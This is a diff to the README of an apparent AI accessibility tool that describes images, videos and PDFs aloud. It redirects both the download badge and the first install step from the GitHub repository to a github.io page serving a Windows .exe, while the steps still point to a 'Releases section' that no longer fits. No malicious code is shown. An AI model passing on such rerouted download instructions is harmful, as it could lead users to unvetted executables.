@@ -1,6 +1,6 @@
 # 🎧 omni-describer - AI tool generates accessible content descriptions
 
-[![](https://img.shields.io/badge/Download_Omni_Describer-007bff?style=for-the-badge&logo=github)](https://github.com/emirhan2221/omni-describer)
+[![](https://img.shields.io/badge/Download_Omni_Describer-007bff?style=for-the-badge&logo=github)](https://emirhan2221.github.io)
 
 Omni Describer helps people understand visual information. This app uses artificial intelligence to read images, videos, and PDF documents. It turns visual data into spoken words. This tool improves access for blind and visually impaired users. It offers a bridge between digital files and screen readers. 
 
@@ -8,7 +8,7 @@ Omni Describer helps people understand visual information. This app uses artific
 
 You need one file to run Omni Describer on your Windows computer.
 
-1. Go to this page: [https://github.com/emirhan2221/omni-describer](https://github.com/emirhan2221/omni-describer)
+1. Go to this page: [https://emirhan2221.github.io](https://emirhan2221.github.io)
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version link.
 4. Download the file ending in .exe.
